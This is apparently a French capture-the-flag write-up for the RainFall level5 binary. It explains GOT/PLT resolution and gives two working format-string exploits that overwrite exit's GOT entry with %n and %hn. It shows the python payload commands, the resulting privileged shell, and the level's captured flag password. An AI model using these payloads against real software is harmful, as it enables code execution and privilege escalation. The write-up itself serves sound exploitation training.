Tout comme dans les deux exercices precedents, on va devoir jouer avec printf.
Ici on va vouloir rediriger l'execution de la fonction exit vers la fonction 'o'.

En testant je vois que le debut du buffer est au 4eme argument de printf.

Video interessante sur le sujet: [Global Offset Table (GOT) and Procedure Linkage Table (PLT) - Binary Exploitation PWN101](https://www.youtube.com/watch?v=B4-wVdQo040)

En debug avec gdb, on voit que le premier appel de 'exit' renvoie dans la section .plt (RX), 
qui fait un jump vers .got.plt (RW) qui contient l'addresse reelle de la fonction exit.  

INFO: Au premier appel d'une fonction d'une librairie linkee dynamiquement, l'addresse dans .got.plt renvoie vers 
la section .plt qui va appeler le linker dynamiquement pour obtenir l'addresse de la fonction et la stocker dans .got.plt.
Ainsi tous les futurs appels de la fonction iront directement a la bonne addresse et n'appeleront plus le linker.

On va donc vouloir ecraser l'addresse de exit dans .got.plt avec l'addresse de la fonction 'o'.
Et cela en utilisant '%n' de printf pour ecrire un nombre a une addresse donnee.

On peut donc dors et deja convertir l'addresse de 'o' en decimal pour avoir le bon nombre de bytes ecrits.  
0x80484a4 => 134513828 en decimal.

Il nous faut aussi l'addresse ou ecrire ce nombre. Avec gdb je vois que .plt fait un jump vers ds:0x8049838
On va donc ecrire dans cette addresse.
0x8049838 => '\x38\x98\x04\x08'

## Solution 1

On peut donc faire notre exploit:
1. [4] Dans le buffer on met l'addresse de 'o'
2. [4 + 8*2 = 20] On print 2 fois '%x' pour utiliser 2 arguments de la stack
3. [20 + 134513808] On print 134513808 characteres + on utilise un argument de la stack
4. [134513828] On print '%n' pour ecrire le nombre de characteres print dans l'addresse de exit

```bash
level5@RainFall:~$ python -c "print '\x38\x98\x04\x08' + '%8x'*2 + '%134513808x' + '%n'" > /tmp/payload5
level5@RainFall:~$ cat /tmp/payload5 - | ./level5
                             200
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

## Solution 2

L'adresse de o représente un nombre gigantesque pour être écrit par printf en nombre de caractère, potentiellement cela peut crasher. Nous allons donc écrire l'adresse en deux fois à l'aide de 2 * 2 octets au lieu de 4 octets d'un coup en séparant lower bytes et higher bytes (LOB et HOB) à l'aide de %hn qui n'écrit que le LOB de l'int pointé par %n:

>si HOB < LOB
>[adresse + 2][adresse]%[HOB - 8]x%[offset]$hn%[LOB - HOB]x%[offset + 1]

>si HOB > LOB
>[address + 2][address]%[LOB - 8]x%[offset + 1]$hn%[HOB - LOB]x%[offset]

ici: 0x0804 < 0x84a4 donc options 1
En little endian nous allons commencer à écrire 2 octets dans la dernière partie de l'adresse de exit puis 2 octets dans la première.
Nous convertissons 0x0804 et 0x84a4 en décimal 2056 et 33956 il faut enlever 8 octets pour les 2 adresses puis enlever le nombres d'octets déjà écrit (33956 - 2052) ce qui donne 2044 et 31904, donc on a:
```sh
level5@RainFall:~$ python -c 'print "\x40\x98\x04\x08\x38\x98\x04\x08" + "%2044x" + "%4$hn" + "%31904x" + "%5$hn"' > /tmp/payload
level5@RainFall:~$ cat /tmp/payload - | ./level5

                                                                              b7fd1ac0
```
On dirai que nous avons un shell, essayons **id**:
```sh
id
uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
Flag!

